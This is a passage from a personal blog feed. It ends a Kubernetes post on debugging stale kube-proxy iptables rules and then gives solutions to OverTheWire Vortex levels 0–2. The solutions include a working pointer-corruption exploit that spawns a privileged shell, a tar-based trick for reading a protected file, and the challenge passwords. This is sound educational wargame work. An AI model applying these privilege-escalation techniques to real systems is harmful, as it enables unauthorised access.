KUBE-SVC-ERIFXISQEP7F7OF4  tcp  --  anywhere             10.178.64.10         /* kube-system/kube-dns:dns-tcp cluster IP */ tcp dpt:domain
KUBE-SVC-TCOU7JCQXEZGVUNU  udp  --  anywhere             10.178.64.10         /* kube-system/kube-dns:dns cluster IP */ udp dpt:domain

# List rules in KUBE-SVC-ERIFXISQEP7F7OF4 chain's nat table
Chain KUBE-SVC-ERIFXISQEP7F7OF4 (1 references)
target     prot opt source               destination
KUBE-SEP-BMNCBK7ROA3MA6UU  all  --  anywhere             anywhere             statistic mode random probability 0.01538461540
KUBE-SEP-GYUBQUCI6VR6AER2  all  --  anywhere             anywhere             statistic mode random probability 0.01562500000
KUBE-SEP-IF56RUVXN2P4ORZZ  all  --  anywhere             anywhere             statistic mode random probability 0.01587301586
KUBE-SEP-WUD7OE7TYMWFJJYX  all  --  anywhere             anywhere             statistic mode random probability 0.01612903224
KUBE-SEP-B7IYZJB6QVUX246S  all  --  anywhere             anywhere             statistic mode random probability 0.01639344264
KUBE-SEP-T6B7SPNOX3DH33BE  all  --  anywhere             anywhere             statistic mode random probability 0.01666666660
KUBE-SEP-REJSUT2VC76HMIRQ  all  --  anywhere             anywhere             statistic mode random probability 0.01694915257
KUBE-SEP-B4N4VXNUSBNXHV73  all  --  anywhere             anywhere             statistic mode random probability 0.01724137925
KUBE-SEP-XUJIW6IGZX4X5BBG  all  --  anywhere             anywhere             statistic mode random probability 0.01754385978
KUBE-SEP-MMBQBWR6AYIPMUZL  all  --  anywhere             anywhere             statistic mode random probability 0.01785714272
KUBE-SEP-6O5U6FAKQVEXGTP7  all  --  anywhere             anywhere             statistic mode random probability 0.01818181807
KUBE-SEP-DMN3RJWMPAEHNOGE  all  --  anywhere             anywhere             statistic mode random probability 0.01851851866
KUBE-SEP-FHJKZIH3JDZSXJUD  all  --  anywhere             anywhere             statistic mode random probability 0.01886792434
KUBE-SEP-YRPM7BEQS2YESSJL  all  --  anywhere             anywhere             statistic mode random probability 0.01923076902
KUBE-SEP-BSHQZGGNYIILL3V7  all  --  anywhere             anywhere             statistic mode random probability 0.01960784290
KUBE-SEP-XTW5FCAH2423EWAV  all  --  anywhere             anywhere             statistic mode random probability 0.02000000002
KUBE-SEP-2ETTGYCM3KLKL54Q  all  --  anywhere             anywhere             statistic mode random probability 0.02040816331
KUBE-SEP-ZUFFQWVT2EY73YVF  all  --  anywhere             anywhere             statistic mode random probability 0.02083333349
KUBE-SEP-VUNSBD5OILT2BGUX  all  --  anywhere             anywhere             statistic mode random probability 0.02127659554
KUBE-SEP-3XVS5OF4SBBHATZW  all  --  anywhere             anywhere             statistic mode random probability 0.02173913037
KUBE-SEP-IRW2YX5BEMBR3OGF  all  --  anywhere             anywhere             statistic mode random probability 0.02222222229
KUBE-SEP-6J6T3TOCBEQ5NUQ5  all  --  anywhere             anywhere             statistic mode random probability 0.02272727247
KUBE-SEP-E3FOMPW5DQK5FDIA  all  --  anywhere             anywhere             statistic mode random probability 0.02325581387
KUBE-SEP-EO4O2TBNDPU377YQ  all  --  anywhere             anywhere             statistic mode random probability 0.02380952379
KUBE-SEP-ZGRZOBXXZ2KPGNZD  all  --  anywhere             anywhere             statistic mode random probability 0.02439024393
KUBE-SEP-XLRCUOCE6XAL3TYE  all  --  anywhere             anywhere             statistic mode random probability 0.02499999991
KUBE-SEP-477YCBVB2RZ4WKUD  all  --  anywhere             anywhere             statistic mode random probability 0.02564102551
KUBE-SEP-FGVS22Q3OCM6S5VS  all  --  anywhere             anywhere             statistic mode random probability 0.02631578967
KUBE-SEP-FBHD55TKQKCEKSUO  all  --  anywhere             anywhere             statistic mode random probability 0.02702702722
KUBE-SEP-ULRGL5A7XKWV3HB6  all  --  anywhere             anywhere             statistic mode random probability 0.02777777798
KUBE-SEP-HO6T2NOJNNMVWDPW  all  --  anywhere             anywhere             statistic mode random probability 0.02857142873
KUBE-SEP-PV23DIU55F5LDJIX  all  --  anywhere             anywhere             statistic mode random probability 0.02941176482
KUBE-SEP-6PL2LOTBN64MN2IF  all  --  anywhere             anywhere             statistic mode random probability 0.03030303027
KUBE-SEP-3G3LTNLLVZWE57GZ  all  --  anywhere             anywhere             statistic mode random probability 0.03125000000
KUBE-SEP-SNHFF6VK2KP44I7Q  all  --  anywhere             anywhere             statistic mode random probability 0.03225806449
KUBE-SEP-KNOCRXE7JOQ4FBTI  all  --  anywhere             anywhere             statistic mode random probability 0.03333333321
KUBE-SEP-M5NXUS47V77SM3HZ  all  --  anywhere             anywhere             statistic mode random probability 0.03448275849
KUBE-SEP-VEMFKB2E3QRFFRSG  all  --  anywhere             anywhere             statistic mode random probability 0.03571428591
KUBE-SEP-RRYDQV524YXA4GDR  all  --  anywhere             anywhere             statistic mode random probability 0.03703703685
KUBE-SEP-G65AAYF5LWFW4YBM  all  --  anywhere             anywhere             statistic mode random probability 0.03846153850
KUBE-SEP-K4HN6ANXSPKA7JGZ  all  --  anywhere             anywhere             statistic mode random probability 0.04000000004
KUBE-SEP-72YXYSKWHCML6KJJ  all  --  anywhere             anywhere             statistic mode random probability 0.04166666651
KUBE-SEP-YCD5TFDQM4ELQ5WX  all  --  anywhere             anywhere             statistic mode random probability 0.04347826075
KUBE-SEP-U7N4W7N5OKDP5PNC  all  --  anywhere             anywhere             statistic mode random probability 0.04545454541
KUBE-SEP-ACPRKJJSJ73NAQNV  all  --  anywhere             anywhere             statistic mode random probability 0.04761904757
KUBE-SEP-HPAV4MFMKCM43BC2  all  --  anywhere             anywhere             statistic mode random probability 0.04999999981
KUBE-SEP-VXO5CPBPAES2GS3A  all  --  anywhere             anywhere             statistic mode random probability 0.05263157887
KUBE-SEP-LJ3HM5QDYEB4ICUB  all  --  anywhere             anywhere             statistic mode random probability 0.05555555550
KUBE-SEP-W6VORIPTN7FDPIMU  all  --  anywhere             anywhere             statistic mode random probability 0.05882352963
KUBE-SEP-A5SGQE4VKXUT2NEC  all  --  anywhere             anywhere             statistic mode random probability 0.06250000000
KUBE-SEP-4LCLRUWZUF2DDGKK  all  --  anywhere             anywhere             statistic mode random probability 0.06666666688
KUBE-SEP-K7NZ33CKVQDPMIET  all  --  anywhere             anywhere             statistic mode random probability 0.07142857136
KUBE-SEP-76ISGBIKEK2QPYDL  all  --  anywhere             anywhere             statistic mode random probability 0.07692307699
KUBE-SEP-3S5ELV7JJCII2KNO  all  --  anywhere             anywhere             statistic mode random probability 0.08333333349
KUBE-SEP-THLYLIADKU5Z5I32  all  --  anywhere             anywhere             statistic mode random probability 0.09090909082
KUBE-SEP-T7P5MBD5MAWH2XB5  all  --  anywhere             anywhere             statistic mode random probability 0.10000000009
KUBE-SEP-WQ6DVZHCVUTU5QJS  all  --  anywhere             anywhere             statistic mode random probability 0.11111111101
KUBE-SEP-5RVGOA4UDKOKKI7O  all  --  anywhere             anywhere             statistic mode random probability 0.12500000000
KUBE-SEP-VSXQV2AZ43RZQSL7  all  --  anywhere             anywhere             statistic mode random probability 0.14285714272
KUBE-SEP-RVDWX7YLRKCSUDII  all  --  anywhere             anywhere             statistic mode random probability 0.16666666651
KUBE-SEP-OECSAM56W6JQA562  all  --  anywhere             anywhere             statistic mode random probability 0.20000000019
KUBE-SEP-HY76TWODHVCVLG5Y  all  --  anywhere             anywhere             statistic mode random probability 0.25000000000
KUBE-SEP-3UNVKH34LEKZ2P5K  all  --  anywhere             anywhere             statistic mode random probability 0.33333333349
KUBE-SEP-TDCXKWGVKJJ22VHB  all  --  anywhere             anywhere             statistic mode random probability 0.50000000000
KUBE-SEP-Z7ZOTGJIY44EKMWW  all  --  anywhere             anywhere

# List the rules of two random chains above to see the DNAT'ed Pod IP
root@toolbox:~# iptables -L KUBE-SEP-RVDWX7YLRKCSUDII -t nat
Chain KUBE-SEP-RVDWX7YLRKCSUDII (1 references)
target     prot opt source               destination
KUBE-MARK-MASQ  all  --  10.179.94.16         anywhere
DNAT       tcp  --  anywhere             anywhere             tcp to::0 persistent:0 persistent

root@toolbox:~# iptables -L KUBE-SEP-6PL2LOTBN64MN2IF -t nat
Chain KUBE-SEP-6PL2LOTBN64MN2IF (1 references)
target     prot opt source               destination
KUBE-MARK-MASQ  all  --  10.179.45.66         anywhere
DNAT       tcp  --  anywhere             anywhere             tcp to::0 persistent:0 persistent
</code></pre>

<p>These final rules are the ones that actually replace the destination Cluster IP of 10.178.64.10 with
a randomly chosen <code>kube-dns</code> Pod IP. The random selection is implemented by the rules in the
<code>KUBE-SVC-ERIFXISQEP7F7OF4</code> chain which have <code>statistic mode random probability p</code>. Rules are
matched top down. So the first rule with target <code>KUBE-SEP-BMNCBK7ROA3MA6UU</code> has a probability of
0.01538461540 of being picked. The second rule with target <code>KUBE-SEP-GYUBQUCI6VR6AER2</code> has a
probability of 0.01562500000 of being picked. But this 0.01562500000 is applied to the probability
that the first rule didn&rsquo;t match. So its overall probability is (1 - 0.01538461540) * 0.01562500000
~= 0.01538461540. Applying this calculation to the other rules, you can see each rule has a
probability of 0.01538461540 or <code>1/n</code> in being selected where <code>n</code> = 65 is the total number of kube-dns
Pods in this case. This algorithm is actually a variation of <a href="https://en.wikipedia.org/wiki/Reservoir_sampling">reservoir sampling</a>.</p>

<h3>Confirming the Root Cause</h3>

<p>At this point I strongly suspected the iptables rules were stale and routing packets to kube-dns
Pod IPs that no longer exist. In order to confirm this I wanted to find an actual DNAT&#8217;ed IP that
didn&rsquo;t correspond to any actual kube-dns Pod. There were 65 rules in the <code>KUBE-SVC-ERIFXISQEP7F7OF4</code>
chain, but I expected 77 because that was the number of <code>kube-dns</code> Pods.</p>

<pre><code>kubectl --context my-gke-cluster -n kube-system get endpoints kube-dns -o json | jq -r .subsets[0].addresses | jq length
77
</code></pre>

<p>On nodes without DNS issues, I saw the correct number of rules.</p>

<pre><code>root@healthy-gke-node:~# iptables -L KUBE-SVC-ERIFXISQEP7F7OF4 -t nat | wc -l
79 [two extra lines of headers]
</code></pre>

<p>I saw this Pod IP when inspecting a randomly chosen rule on <code>my-gke-node</code>.</p>

<pre><code>root@toolbox:~# iptables -L KUBE-SEP-RVDWX7YLRKCSUDII -t nat
Chain KUBE-SEP-RVDWX7YLRKCSUDII (1 references)
target     prot opt source               destination
KUBE-MARK-MASQ  all  --  10.179.94.16         anywhere
DNAT       tcp  --  anywhere             anywhere             tcp to::0 persistent:0 persistent
</code></pre>

<p>No <code>kube-dns</code> Pod existed with this IP.</p>

<pre><code>kubectl --context my-gke-cluster -n kube-system get pods --selector k8s-app=kube-dns -o wide | grep 10.179.94.16
[no output]
</code></pre>

<p>This confirmed <code>kube-proxy</code> wasn&rsquo;t updating the iptables rules for <code>kube-dns</code>. Why? The <code>kube-proxy</code>
logs on the node showed these ongoing occurring errors.</p>

<pre><code>dxia@my-gke-node ~ $ tail -f /var/log/kube-proxy.log
E0126 20:40:24.739255       1 reflector.go:153] k8s.io/client-go/informers/factory.go:135: Failed to list *v1.Service: an error on the server ("") has prevented the request from succeeding (get services)
E0126 20:40:24.739611       1 reflector.go:153] k8s.io/client-go/informers/factory.go:135: Failed to list *v1.Endpoints: an error on the server ("") has prevented the request from succeeding (get endpoints)
E0126 20:40:34.742869       1 reflector.go:153] k8s.io/client-go/informers/factory.go:135: Failed to list *v1.Service: an error on the server ("") has prevented the request from succeeding (get services)
</code></pre>

<h2>The Speculative Fix</h2>

<p>I think these <code>kube-proxy</code> errors are caused by this underlying K8s bug, but I&rsquo;m not sure.</p>

<blockquote><p>we found that after the problem occurred all subsequent requests were still send on the same
connection. It seems that although the client will resend the request to apiserver, but the
underlay http2 library still maintains the old connection so all subsequent requests are still
send on this connection and received the same error use of closed connection.</p>

<p>So the question is why http2 still maintains an already closed connection? Maybe the connection it
maintained is indeed alive but some intermediate connections are closed unexpectedly?</p></blockquote>

<p>&mdash; <a href="https://github.com/kubernetes/kubernetes/issues/87615#issuecomment-596312532">https://github.com/kubernetes/kubernetes/issues/87615#issuecomment-596312532</a></p>

<p>The bug in that issue is <a href="https://github.com/kubernetes/kubernetes/issues/87615#issuecomment-743342319">fixed in K8s 1.19 and 1.20</a>.</p>

<p>If you&rsquo;re using GKE and Google Cloud Monitoring, this log query will show which nodes&#8217; kube-proxy
Pods can&rsquo;t get updated Service and Endpoint data from the K8s API.</p>

<pre><code>resource.type="k8s_node"
resource.labels.project_id="[YOUR-PROJECT]"
logName="projects/[YOUR-PROJECT]/logs/kube-proxy"
jsonPayload.message:"Failed to list "
severity=ERROR
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[My Hints and Solutions to the First Three Levels of Over the Wire Vortex]]></title>
    <link href="https://www.davidxia.com/2020/12/my-hints-and-solutions-to-the-first-three-levels-of-over-the-wire-vortex/"/>
    <updated>2020-12-25T20:21:28-05:00</updated>
    <id>https://www.davidxia.com/2020/12/my-hints-and-solutions-to-the-first-three-levels-of-over-the-wire-vortex</id>
    <content type="html"><![CDATA[<p>I recently found more wargames at <a href="https://overthewire.org/">overthewire.org</a>. Here are my hints and
solutions for the first three levels of Vortex. The levels are cumulative. We
have to beat the previous level in order to access the next.</p>

<h1><a href="https://overthewire.org/wargames/vortex/vortex0.html">Vortex Level 0 -> Level 1</a></h1>

<p><details>
  <summary>Hint 1: how much data</summary>
  Connect to the host and port and read all the bytes you can. How many bytes do you get?
</details></p>

<p><details>
  <summary>Hint 2: endianess</summary>
  &ldquo;&hellip;read in 4 unsigned integers in host byte order&rdquo; means the bytes are
  already in host byte order or little-endian. If your system is also
  little-endian, you don&rsquo;t need to do anything special when interpreting the
  bytes.
</details></p>

<p><details>
  <summary>Hint 3: expected reply</summary>
  How many bytes is each integer? What is the sum of all four?
</details></p>

<!-- more -->


<h2>My solution</h2>

<pre><code class="python">#!/usr/bin/env python3

# Example output
# got bytes 53 ac 40 65 d4 36 07 63 5b 74 dd 4b 0f b6 cc 4d
# sum of first four unsigned ints (16 bytes assuming each unsigned int is 4 bytes) is 5938220433
# replying with bytes 91 0d f2 61 01 00 00 00
# Username: vortex1 Password: Gq#qu3bF3

import binascii
import struct
import socket

HOST = 'vortex.labs.overthewire.org'
PORT = 5842

s = socket.socket()
s.connect((HOST, PORT))

r = s.recv(1024)
print(f'got bytes {r.hex(" ")}')

ba = bytearray(r)
# Since the machine is a 32-bit system, each integer will be four bytes.
# So we interpret each integer four bytes at a time.
int_a = struct.unpack('I', ba[:4])[0]
int_b = struct.unpack('I', ba[4:8])[0]
int_c = struct.unpack('I', ba[8:12])[0]
int_d = struct.unpack('I', ba[12:16])[0]

# Sum all the integers.
_sum = int_a + int_b + int_c + int_d
print(f'sum of first four unsigned ints (16 bytes assuming each unsigned int is 4 bytes) is {_sum}')

# Packing like this seems to take care of endianess by default
reply_bytes = struct.pack('Q', _sum)
print(f'replying with bytes {reply_bytes.hex(" ")}')
s.sendall(reply_bytes)
r = s.recv(1024)
print(r.decode('ascii'))

s.close()
</code></pre>

<h1><a href="https://overthewire.org/wargames/vortex/vortex1.html">Vortex Level 1 -> Level 2</a></h1>

<p>This solution assumes we have solved the previous level and can SSH into the
machine as user vortex1. Caveat: the machine is extremely slow.</p>

<p>First let&rsquo;s find out some information about the machine.</p>

<pre><code>ssh vortex1@vortex.labs.overthewire.org -p 2228
                 _
__   _____  _ __| |_ _____  __
\ \ / / _ \| '__| __/ _ \ \/ /
 \ V / (_) | |  | ||  __/&gt;  &lt;
  \_/ \___/|_|   \__\___/_/\_\

a http://www.overthewire.org wargame.

vortex1@vortex.labs.overthewire.org's password:
Welcome to Ubuntu 14.04 LTS (GNU/Linux 4.4.0-92-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
</code></pre>

<p>It&rsquo;s a machine running Ubuntu 14.04.</p>

<pre><code>vortex1@vortex:~$ uname -i
x86_64
</code></pre>

<p>It&rsquo;s a 64-bit system.</p>

<pre><code>vortex1@vortex:~$ cat /proc/sys/kernel/randomize_va_space
0
</code></pre>

<p>ASLR is disabled.</p>

<p><details>
  <summary>Hint 1: password location for next level</summary>
  The instructions don&rsquo;t tell you this, but the password for the next level is
  located in the directory <code>/etc/vortex_pass</code>.
</details></p>

<p><details>
  <summary>Hint 2: required permissions</summary>
  What are the permissions of the password file for the next level? How can you
  read this file?
</details></p>

<p><details>
  <summary>Hint 3: program source code</summary>
  What does the program do? Can you see the code path you need to execute to
  elevate your privileges?
</details></p>

<p><details>
  <summary>Hint 4: how to change <code>ptr</code></summary>
  How can you change the value of <code>ptr</code> to the right value? You shouldn&rsquo;t need
  to send more than ~300 bytes to the program to do so.
</details></p>

<h2>My solution</h2>

<p>Let&rsquo;s disassemble the executable to gain some insight into the stack layout.</p>

<pre><code>vortex1@vortex:~$ gdb /vortex/vortex1
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /vortex/vortex1...(no debugging symbols found)...done.

(gdb) set disassembly-flavor intel
(gdb) set pagination off
(gdb) disassemble main
Dump of assembler code for function main:
   0x080485c0 &lt;+0&gt;: push   ebp
   0x080485c1 &lt;+1&gt;: mov    ebp,esp
   0x080485c3 &lt;+3&gt;: push   esi
   0x080485c4 &lt;+4&gt;: push   ebx
   0x080485c5 &lt;+5&gt;: and    esp,0xfffffff0
   0x080485c8 &lt;+8&gt;: sub    esp,0x220                  # Set stack pointer
   0x080485ce &lt;+14&gt;:    mov    eax,gs:0x14
   0x080485d4 &lt;+20&gt;:    mov    DWORD PTR [esp+0x21c],eax  
   0x080485db &lt;+27&gt;:    xor    eax,eax
   0x080485dd &lt;+29&gt;:    lea    eax,[esp+0x1c]
   0x080485e1 &lt;+33&gt;:    add    eax,0x100                  # + (sizeof(buf) / 2)
   0x080485e6 &lt;+38&gt;:    mov    DWORD PTR [esp+0x14],eax   # ptr is located at $esp + 0x14
   0x080485ea &lt;+42&gt;:    jmp    0x804868e &lt;main+206&gt;
   0x080485ef &lt;+47&gt;:    mov    eax,DWORD PTR [esp+0x18]
   0x080485f3 &lt;+51&gt;:    cmp    eax,0xa
   0x080485f6 &lt;+54&gt;:    je     0x80485ff &lt;main+63&gt;
   0x080485f8 &lt;+56&gt;:    cmp    eax,0x5c
   0x080485fb &lt;+59&gt;:    je     0x8048615 &lt;main+85&gt;
   0x080485fd &lt;+61&gt;:    jmp    0x804861c &lt;main+92&gt;
   0x080485ff &lt;+63&gt;:    mov    DWORD PTR [esp+0x4],0x200
   0x08048607 &lt;+71&gt;:    lea    eax,[esp+0x1c]
   0x0804860b &lt;+75&gt;:    mov    DWORD PTR [esp],eax
   0x0804860e &lt;+78&gt;:    call   0x804856d &lt;print&gt;
   0x08048613 &lt;+83&gt;:    jmp    0x804868e &lt;main+206&gt;
   0x08048615 &lt;+85&gt;:    sub    DWORD PTR [esp+0x14],0x1
   0x0804861a &lt;+90&gt;:    jmp    0x804868e &lt;main+206&gt;
   0x0804861c &lt;+92&gt;:    mov    eax,DWORD PTR [esp+0x14]
   0x08048620 &lt;+96&gt;:    and    eax,0xff000000
   0x08048625 &lt;+101&gt;:   cmp    eax,0xca000000
   0x0804862a &lt;+106&gt;:   jne    0x804866b &lt;main+171&gt;
   0x0804862c &lt;+108&gt;:   call   0x8048430 &lt;geteuid@plt&gt;
   0x08048631 &lt;+113&gt;:   mov    esi,eax
   0x08048633 &lt;+115&gt;:   call   0x8048430 &lt;geteuid@plt&gt;
   0x08048638 &lt;+120&gt;:   mov    ebx,eax
   0x0804863a &lt;+122&gt;:   call   0x8048430 &lt;geteuid@plt&gt;
   0x0804863f &lt;+127&gt;:   mov    DWORD PTR [esp+0x8],esi
   0x08048643 &lt;+131&gt;:   mov    DWORD PTR [esp+0x4],ebx
   0x08048647 &lt;+135&gt;:   mov    DWORD PTR [esp],eax
   0x0804864a &lt;+138&gt;:   call   0x80483e0 &lt;setresuid@plt&gt;
   0x0804864f &lt;+143&gt;:   mov    DWORD PTR [esp+0x8],0x0
   0x08048657 &lt;+151&gt;:   mov    DWORD PTR [esp+0x4],0x804876a
   0x0804865f &lt;+159&gt;:   mov    DWORD PTR [esp],0x804876d
   0x08048666 &lt;+166&gt;:   call   0x8048420 &lt;execlp@plt&gt;
   0x0804866b &lt;+171&gt;:   lea    eax,[esp+0x1c]
   0x0804866f &lt;+175&gt;:   add    eax,0x200
   0x08048674 &lt;+180&gt;:   cmp    DWORD PTR [esp+0x14],eax
   0x08048678 &lt;+184&gt;:   jbe    0x804867c &lt;main+188&gt;
   0x0804867a &lt;+186&gt;:   jmp    0x804868d &lt;main+205&gt;
   0x0804867c &lt;+188&gt;:   mov    eax,DWORD PTR [esp+0x14]
   0x08048680 &lt;+192&gt;:   lea    edx,[eax+0x1]
   0x08048683 &lt;+195&gt;:   mov    DWORD PTR [esp+0x14],edx
   0x08048687 &lt;+199&gt;:   mov    edx,DWORD PTR [esp+0x18]
   0x0804868b &lt;+203&gt;:   mov    BYTE PTR [eax],dl
   0x0804868d &lt;+205&gt;:   nop
   0x0804868e &lt;+206&gt;:   call   0x8048400 &lt;getchar@plt&gt;
   0x08048693 &lt;+211&gt;:   mov    DWORD PTR [esp+0x18],eax          # x is located at $esp + 0x18
   0x08048697 &lt;+215&gt;:   cmp    DWORD PTR [esp+0x18],0xffffffff
   0x0804869c &lt;+220&gt;:   jne    0x80485ef &lt;main+47&gt;
   0x080486a2 &lt;+226&gt;:   mov    DWORD PTR [esp],0x8048775
   0x080486a9 &lt;+233&gt;:   call   0x8048440 &lt;puts@plt&gt;
   0x080486ae &lt;+238&gt;:   mov    eax,0x0
   0x080486b3 &lt;+243&gt;:   mov    ecx,DWORD PTR [esp+0x21c]
   0x080486ba &lt;+250&gt;:   xor    ecx,DWORD PTR gs:0x14
   0x080486c1 &lt;+257&gt;:   je     0x80486c8 &lt;main+264&gt;
   0x080486c3 &lt;+259&gt;:   call   0x8048410 &lt;__stack_chk_fail@plt&gt;
   0x080486c8 &lt;+264&gt;:   lea    esp,[ebp-0x8]
   0x080486cb &lt;+267&gt;:   pop    ebx
   0x080486cc &lt;+268&gt;:   pop    esi
   0x080486cd &lt;+269&gt;:   pop    ebp
   0x080486ce &lt;+270&gt;:   ret
End of assembler dump.
</code></pre>

<p>At <code>main+8</code>, the stack pointer <code>esp</code> is decreased by 0x220 to make room for <code>unsigned
char buf[512]</code>, <code>unsigned char *ptr</code>, and <code>unsigned int x</code>. If we look more closely at the assembly,
we can see <code>ptr</code> is located at <code>esp + 0x14</code> because the instruction before that increases <code>eax</code> by
<code>0x100</code> or <code>(sizeof(buf) / 2)</code> or 256. <code>main+211</code> shows <code>x</code> is located right after <code>ptr</code> at <code>esp +
0x18</code> since the instruction right before calls <code>getchar()</code>. This means <code>buf[512]</code> is after that and
takes up the majority of the stack. So the stack layout is <code>ptr</code>, <code>x</code>, then <code>buf[512]</code>. This makes
sense because the compiler on more modern systems will put buffers after other variables to protect
against buffer overflows.</p>

<p>Question: why is the size of <code>ptr</code> only 4 bytes? I thought on 64-bit systems pointer variables are 8
bytes not 4 since memory should be 64-bit- or 8-byte-addressable?</p>

<p>We set a breakpoint at the <code>getchar()</code> call and run the program. Examine the first 64 words of <code>esp</code>
in hexadecimal.</p>

<pre><code>(gdb) break *main+206
Breakpoint 1 at 0x804868e

(gdb) run
Starting program: /vortex/vortex1

Breakpoint 1, 0x0804868e in main ()

(gdb) x/64wx $esp
0xffffd4c0: 0xf7e303b4  0xf7fd81a8  0x00000000  0xf7fec4a8
0xffffd4d0: 0x00000007  0xffffd5dc  0x00000001  0x00000000
0xffffd4e0: 0x00000001  0xf7fd81a8  0xf7ffd000  0xf7fe6d3b
0xffffd4f0: 0xf7ffc000  0x00001000  0x00000001  0xf7fe6cfc
0xffffd500: 0xf7ffd000  0x00000000  0xffffd5c8  0xf7fe724b
0xffffd510: 0xf7ffdaf0  0xf7fd8760  0x00000001  0x00000001
0xffffd520: 0x00000000  0xf7ff578c  0x00000000  0x00000000
0xffffd530: 0xf7ffd55c  0xffffd598  0xffffd5b8  0x00000000
0xffffd540: 0xf7ff578c  0xf7ffd55c  0xffffd5b8  0xf7fdc4ac
0xffffd550: 0xf7fdc2dc  0xf7fe4f3d  0xf7e36061  0x080482ff
0xffffd560: 0x00000000  0xf7fdc33c  0x00000000  0xf7fdc000
0xffffd570: 0x00000040  0x00000002  0x0804827d  0xf7ffdc24
0xffffd580: 0xf7e226bc  0xf7ffd000  0xf7e26cc4  0x00000001
0xffffd590: 0xf7fd8460  0xf7fe5694  0x00000000  0x00000000
0xffffd5a0: 0x00000000  0x00000000  0xf7fd8460  0x00000003
0xffffd5b0: 0xffffd5e0  0x07b1ea71  0xf63d4e2e  0xf7e26ed4
</code></pre>

<p><code>ptr</code> is located at <code>$esp + 0x14 = 0xffffd4d4</code> which is initialized with a value of <code>0xffffd5dc</code>.
Since ASLR is disabled, this location is fixed.</p>

<p>I first thought of a brute-force strategy of decrementing <code>ptr</code>&rsquo;s value with <code>\</code> until its highest
byte was <code>0xca</code>. That way, when it&rsquo;s bit-wise ANDed with <code>0xff000000</code>, the result would be
<code>0xca000000</code>. The exploit would be the following.</p>

<pre><code>(python -c 'import sys; sys.stdout.write("\\" * (0xffffe470 - 0xcaffffff) + "\x00")'; cat) \
  | /vortex/vortex1

id
uid=5002(vortex2) gid=5001(vortex1) groups=5002(vortex2),5001(vortex1)

cat /etc/vortex_pass/vortex2
23anbT\rE
</code></pre>

<p>Aside: the Python command is run in a subshell with an extra <code>cat</code> to keep the <code>/bin/sh</code> listening
to more input from the stdout of that subshell. That way we can add more commands from the
terminal. The Python command triggers the <code>/bin/sh</code>. The <code>cat</code> with no args just reads from the
current stdin and feeds data to <code>/bin/sh</code>. See this <a href="https://security.stackexchange.com/a/155845/4350">Stack Exchange answer</a>.</p>

<p>This is definitely not the best solution because 0xffffd5dc - 0xcaffffff = 0x34ffd5dd =
889,181,661. If written to disk, this file would be almost a gigabyte.</p>

<p>Let&rsquo;s think of a better solution. There&rsquo;s no lower bound checking on <code>ptr</code>&rsquo;s value. So we can
decrement the value of <code>ptr</code> until it references its own memory address which starts at <code>0xffffd4d4</code>.
Then we write <code>0xca</code> into the highest byte at <code>0xffffd4d7</code>. <code>ptr</code>&rsquo;s value is initialized to
<code>0xffffd5dc</code>. So we write this many <code>\</code>: 0xffffd5dc - 0xffffd4d7 = 0x105 = 261. Instead of the
seemingly arbitrary 261, we&rsquo;ll use 512/2 + 5. This is more descriptive because it shows we&rsquo;re moving
the <code>ptr</code> reference from where it starts in the middle of <code>buf[512]</code> back to the beginning and then
past the <code>x</code> and one byte into itself.</p>

<pre><code>(python -c 'import sys; sys.stdout.write("\\" * (512/2 + 5) + "\xca" + "A")'; cat) \
  | /vortex/vortex1

id
uid=5002(vortex2) gid=5001(vortex1) groups=5002(vortex2),5001(vortex1)
</code></pre>

<p>Now that we have a shell as vortex2, we can read the password to advance to the next level.</p>

<pre><code>ls /etc/vortex_pass
vortex0   vortex11  vortex14  vortex17  vortex2   vortex22  vortex25  vortex5  vortex8
vortex1   vortex12  vortex15  vortex18  vortex20  vortex23  vortex3   vortex6  vortex9
vortex10  vortex13  vortex16  vortex19  vortex21  vortex24  vortex4   vortex7

cat /etc/vortex_pass/vortex2
23anbT\rE
</code></pre>

<h1><a href="https://overthewire.org/wargames/vortex/vortex2.html">Vortex Level 2 -> Level 3</a></h1>

<p><details>
  <summary>Hint 1: number of args</summary>
  You don&rsquo;t need to use all the available <code>argv</code> slots used in the executable.
</details></p>

<p><details>
  <summary>Hint 2: <code>$$</code></summary>
  What is <code>$$</code>? What is its value in the context of the executable?
</details></p>

<p><details>
  <summary>Hint 3: file to tar</summary>
  What file do you need to read? How can you use the program to read it?
</details></p>

<h2>My solution</h2>

<pre><code>vortex2@vortex:~$ /vortex/vortex2 /etc/vortex_pass/vortex3
/bin/tar: Removing leading `/' from member names

vortex2@vortex:/etc/vortex_pass$ ls -ail /tmp/ownership.$$.tar
ls: cannot access /tmp/ownership.1657.tar: No such file or directory

vortex2@vortex:~$ ls -ail /tmp/ownership.\$$.tar
2670 -rw-rw-r-- 1 vortex3 vortex2 10240 Dec 26 21:15 /tmp/ownership.$$.tar

vortex2@vortex:~$ tar -xvf /tmp/ownership.\$$.tar
etc/vortex_pass/vortex3

vortex2@vortex:~$ ls -ail etc/vortex_pass/
total 12
2808 drwxrwxr-x 2 vortex2 vortex2 4096 Dec 26 21:16 .
2689 drwxrwxr-x 3 vortex2 vortex2 4096 Dec 26 21:16 ..
2809 -r-------- 1 vortex2 vortex2   10 Nov  4  2019 vortex3

vortex2@vortex:~$ cat etc/vortex_pass/vortex3
64ncXTvx#
</code></pre>
]]></content>
  </entry>
  
</feed>
